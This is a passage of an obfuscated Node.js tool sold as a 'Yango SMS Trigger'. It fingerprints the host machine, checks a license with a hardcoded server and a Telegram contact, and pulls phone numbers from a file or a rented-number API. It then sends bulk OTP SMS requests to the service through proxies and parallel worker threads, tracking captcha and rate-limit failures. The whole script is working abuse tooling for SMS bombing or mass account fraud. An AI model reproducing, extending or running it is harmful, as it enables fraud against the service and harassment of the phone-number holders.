            }).toString().split('\x0a')[1]?.["trim"]() || '';
          v183 = v186 + '|' + v187 + '|' + v188;
        } catch (v189) {}
        (!v183 || v183.replace(/\|/g, '').length < 3) && (v183 = v181.hostname() + '|' + v181.arch() + '|' + (v181.cpus()?.[0]?.["model"] || '') + '|' + v181.totalmem());
        const v184 = crypto.createHash("sha256").update(v183).digest("hex").toUpperCase();
        return "SKING-" + v184.substring(0, 8) + '-' + v184.substring(8, 12) + '-' + v184.substring(12, 16);
      } else {
        let v190 = [];
        try {
          const v194 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
            'stdio': "pipe",
            'timeout': 0x1388
          }).toString().trim();
          if (v194 && v194 !== "null") v190.push('A:' + v194);
        } catch (v195) {}
        try {
          if (fs.existsSync("/proc/cpuinfo")) {
            const v196 = fs.readFileSync("/proc/cpuinfo", "utf8"),
              v197 = v196.match(/Serial\s*:\s*(\S+)/i),
              v198 = v196.match(/Hardware\s*:\s*(.+)/i);
            if (v197 && v197[1] !== "0000000000000000") v190.push('S:' + v197[1].trim());
            if (v198) v190.push('H:' + v198[1].trim());
          }
        } catch (v199) {}
        try {
          if (fs.existsSync("/etc/machine-id")) {
            const v200 = fs.readFileSync("/etc/machine-id", "utf8").trim();
            if (v200) v190.push('M:' + v200);
          }
        } catch (v201) {}
        try {
          const v202 = v181.cpus(),
            v203 = v202 && v202.length > 0 ? v202[0].model : "UnknownCPU",
            v204 = v181.totalmem(),
            v205 = v181.release(),
            v206 = v181.hostname();
          v190.push('F:' + v203 + '|' + v204 + '|' + v205 + '|' + v206);
        } catch (v207) {}
        const v191 = v190.join('||'),
          v192 = crypto.createHash("sha256").update(v191).digest("hex").toUpperCase(),
          v193 = require('os').platform() === "android" ? "ANKING-" : "SKING-";
        return v193 + v192.substring(0, 8) + '-' + v192.substring(8, 12) + '-' + v192.substring(12, 16);
      }
    } catch (v208) {
      return '';
    }
  }
  function fn6(v209, v210) {
    if (!v210) return false;
    const v211 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(v209, "utf8"), v211, Buffer.from(v210, "base64"));
    } catch (v212) {
      return false;
    }
  }
  const v157 = fn5.toString(),
    v158 = crypto.createHash("md5").update(v157).digest("hex");
  let v159 = '';
  const v160 = process.argv.slice(2).filter(v213 => !v213.startsWith('--'));
  v160[5] && v160[5] !== "SKING-UI-HARDWARE-ID" && (v159 = v160[5]);
  !v159 && (v159 = fn5());
  globalHwid = v159;
  !v159 && (console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows.\n")), process.exit(1));
  if (!v160[5]) {
    const v214 = fn5();
    v214 !== v159 && (console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n")), process.exit(1));
  }
  printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + M("Yango SMS Trigger            ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v159.padEnd(29)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘")), console.log('');
  let v161 = false,
    v162 = "Licensed";
  const v163 = Date.now();
  try {
    const v215 = "188.137.176.163",
      v216 = require("http"),
      v217 = await new Promise((v218, v219) => {
        const v220 = {};
        v220.hwid = v159, v220.app_id = "yango";
        v220.version = "1.0.0", v220.timestamp = v163;
        const v221 = JSON.stringify(v220),
          v222 = {
            'hostname': v215,
            'port': 0xec1,
            'path': "/api/verify",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v221)
            },
            'timeout': 0x2710
          };
        const v223 = v216.request(v222, v224 => {
          let v225 = '';
          v224.on("data", v226 => v225 += v226), v224.on("end", () => {
            try {
              v218(JSON.parse(v225));
            } catch (v227) {
              v219(v227);
            }
          });
        });
        v223.on("error", v219), v223.on("timeout", function () {
          this.destroy();
          v219(new Error("Timeout"));
        }), v223.write(v221), v223.end();
      });
    if (v217) {
      v217.status === "update_required" && (console.error(R("\n  ✗ Update required! Please download the latest version.\n")), process.exit(1));
      if (v217.status === "banned" || v217.status === "expired" || !v217.sig) {
        await new Promise(v230 => setTimeout(v230, 2000));
        let v229 = String(v217.reason || "NOT REGISTERED");
        if (!v217.reason && !v217.sig) v229 = "NOT REGISTERED / REMOVED";
        console.error(R("\n  ╔══════════════════════════════════════════════╗")), console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — YANGO TOOL     ║")), console.error(R("  ╠══════════════════════════════════════════════╣")), console.error(R("  ║  HWID   : ") + Y(v159.padEnd(33)) + R('║')), console.error(R("  ║  Status : " + v229.padEnd(26) + '║')), console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║")), console.error(R("  ╚══════════════════════════════════════════════╝\n")), process.exit(1);
      }
      const v228 = v159 + "|yango|1.0.0|" + v163;
      !fn6(v228, v217.sig) && (console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n")), process.exit(1)), v161 = true, v162 = v217.user || "Licensed User";
    }
  } catch (v231) {
    console.error(R("\n  ✗ License server unreachable. Please check internet connection.\n")), process.exit(1);
  }
  !v161 && (console.error(R("\n  ✗ License validation failed.\n")), process.exit(1));
  printHeader(), console.log(B("  ✓ License: " + v162) + G(" | HWID: " + v159 + '\x0a'));
  let v164 = "numbers.txt",
    v165 = null;
  const v166 = await selectOption("SELECT NUMBER SOURCE", [{
    'name': "📁 Load from file (numbers.txt)",
    'value': "file"
  }, {
    'name': "🌐 Auto fetch from NexaOTP Panel",
    'value': "nexa"
  }]);
  if (v166 === "nexa") {
    let v232 = '';
    const v233 = path.join(__dirname, ".nexa_api_key");
    if (fs.existsSync(v233)) {
      const v240 = fs.readFileSync(v233, "utf8").trim(),
        v241 = await selectOption("Found saved API Key (..." + v240.slice(-4) + "). Use it?", [{
          'name': "Yes, use saved key",
          'value': "yes"
        }, {
          'name': "No, enter new key",
          'value': 'no'
        }, {
          'name': "Delete saved key",
          'value': "delete"
        }]);
      if (v241 === "yes") v232 = v240;else v241 === "delete" && (fs.unlinkSync(v233), console.log(G("\n   ✗ Saved key deleted.\n")));
    }
    if (!v232) {
      v232 = await promptText("Enter NexaOTP API Key:", '');
      const v242 = {};
      v242.name = 'No', v242.value = 'no';
      const v243 = await selectOption("Save this key for future use?", [{
        'name': "Yes, save it",
        'value': "yes"
      }, v242]);
      v243 === "yes" && (fs.writeFileSync(v233, v232, "utf8"), console.log(G("\n   ✓ API key saved.\n")));
    }
    let v234 = [],
      v235 = true;
    while (v235) {
      const v244 = await promptText("Enter range #" + (v234.length + 1) + " (e.g. 21624485XXX):", '');
      if (v244) v234.push(v244);
      const v245 = await selectOption("Add another range?", [{
        'name': "Yes",
        'value': "yes"
      }, {
        'name': "No, proceed",
        'value': 'no'
      }]);
      if (v245 === 'no') v235 = false;
    }
    const v236 = await promptText("How many numbers to process? (e.g. 100):", '50'),
      v237 = parseInt(v236) || 50,
      v238 = await selectOption("SELECT NEXA SERVER", [{
        'name': "Server 1 (/get)",
        'value': "/api/v1/numbers/get"
      }, {
        'name': "Server 2 (/p2/get)",
        'value': "/api/v1/numbers/p2/get"
      }, {
        'name': "Server 3 (/p3/get)",
        'value': "/api/v1/numbers/p3/get"
      }]),
      v239 = {};
    v239.apiKey = v232, v239.ranges = v234, v239.totalCount = v237, v239.serverEndpoint = v238, v165 = v239;
  } else while (true) {
    v164 = await promptText("Enter Numbers File Path [default: numbers.txt]:", "numbers.txt");
    !fs.existsSync(v164) && (fs.writeFileSync(v164, ''), console.log(Y("\n   ! File '" + v164 + "' created. Please add numbers to it and restart.\n")), process.exit(1));
    const v246 = fs.readFileSync(v164, "utf8").split(/\r?\n/).map(v247 => v247.trim()).filter(v248 => v248 && v248.replace(/\D/g, '').length >= 7);
    v246.length === 0 && (console.log(R("\n   ✗ Error: No valid numbers found in '" + v164 + "'. Please provide a file with numbers.\n")), process.exit(1));
    break;
  }
  let v167 = await promptText("Enter Proxies File Path (Leave blank for direct) [default: none]:", "none");
  (v167 === "none" || v167 === '') && (v167 = '');
  const v168 = parseInt(await promptText("Enter custom worker count (threads) [default: 20]:", '20')) || 20;
  process.stdin.pause();
  let v169 = [];
  !v165 && (v169 = fs.readFileSync(v164, "utf8").split(/\r?\n/).map(v249 => v249.trim()).filter(v250 => v250 && v250.replace(/\D/g, '').length >= 7));
  let v170 = [];
  v167 && fs.existsSync(v167) && (v170 = fs.readFileSync(v167, "utf8").split('\x0a').map(v251 => v251.trim()).filter(v252 => v252.length > 0));
  printHeader();
  if (v165) console.log(Y("✓ Target: " + v165.totalCount + " numbers via NexaOTP"));else console.log(Y("✓ Loaded " + v169.length + " targets"));
  console.log(G("  Proxies loaded: " + v170.length)), console.log(C("✓ Threads: " + v168 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, '');
  const v171 = new Dashboard(v165 ? v165.totalCount : v169.length);
  let v172 = [],
    v173 = [],
    v174 = 0,
    v175 = false;
  v165 && (async () => {
    try {
      for (let v253 = 0; v253 < v165.totalCount; v253++) {
        try {
          const v254 = v165.ranges[Math.floor(Math.random() * v165.ranges.length)],
            v255 = await nexaLimiter.enqueue(() => nexaFetchNumber(v165.apiKey, v254, v165.serverEndpoint));
          v255 && (v174++, v173.length > 0 ? v173.shift()(v255) : v172.push(v255));
        } catch (v256) {
          if (v256.message.includes("Insufficient balance") || v256.message.includes("No numbers available")) break;
        }
      }
    } finally {
      v175 = true;
      while (v173.length > 0) v173.shift()(null);
    }
  })();
  const v176 = v165 ? () => {
    if (v172.length > 0) return Promise.resolve(v172.shift());
    if (v175) return Promise.resolve(null);
    return new Promise(v257 => v173.push(v257));
  } : () => {
    if (v169.length === 0) return Promise.resolve(null);
    const v258 = Math.floor(Math.random() * v169.length);
    return Promise.resolve(v169.splice(v258, 1)[0]);
  };
  let v177 = 0;
  const fn7 = () => {
    if (v170.length === 0) return null;
    const v259 = v170[v177 % v170.length];
    v177++;
    return v259;
  };
  function fn8(v260) {
    try {
      const v261 = fs.readFileSync(v164, "utf8"),
        v262 = v261.split(/\r?\n/).filter(v263 => v263.trim() !== v260.trim()).join('\x0a');
      fs.writeFileSync(v164, v262);
    } catch (v264) {}
  }
  const v178 = v165 ? Math.min(v168, v165.totalCount) : Math.min(v168, v169.length),
    v179 = [],
    v180 = setInterval(() => v171.render(), 500);
  function fn9(v265) {
    return new Promise(v266 => setTimeout(v266, v265));
  }
  async function fn10(v267) {
    while (true) {
      const v268 = await v176();
      if (!v268) break;
      try {
        const v270 = fn7(),
          v271 = await triggerSms(v268, v270, v267, v171);
        if (v271.success) {
          {
            v171.successful++;
            v171.processed++;
            fn8(v268);
            fs.appendFileSync(SUCCESSFUL_FILE, v271.phone + "|OTP_SENT\n");
            v171.addLog("Triggered OTP for " + v271.phone, "success");
          }
        } else {
          if (v271.message && v271.message.startsWith("time:")) {
            const v272 = v271.message.slice(5);
            v171.failed++, v171.processed++, fs.appendFileSync(FAILED_FILE, v271.phone + "|time wanted " + v272 + '\x0a'), v171.addLog("Failed on " + v271.phone + ':\x20' + v272 + " time wanted", "time");
          } else {
            if (v271.message === "Captcha Required") {
              {
                v171.failed++;
                v171.processed++;
                fn8(v268);
                fs.appendFileSync(FAILED_FILE, v271.phone + "|Captcha Required\n");
                v171.addLog("Captcha Required on " + v271.phone, "error");
              }
            } else v171.failed++, v171.processed++, fs.appendFileSync(FAILED_FILE, v271.phone + '|' + v271.message + '\x0a'), v171.addLog("Failed on " + v271.phone + ':\x20' + v271.message, "error");
          }
        }
      } catch (v273) {
        v171.failed++, v171.processed++, v171.addLog("Fatal error on " + v268 + ':\x20' + v273.message, "error");
      }
      const v269 = Math.floor(Math.random() * 3000) + 1500;
      await fn9(v269);
    }
  }
  for (let v274 = 0; v274 < v178; v274++) {
    v179.push(fn10(v274));
  }
  await Promise.all(v179), clearInterval(v180), v171.render(), v171.stop();
}
start();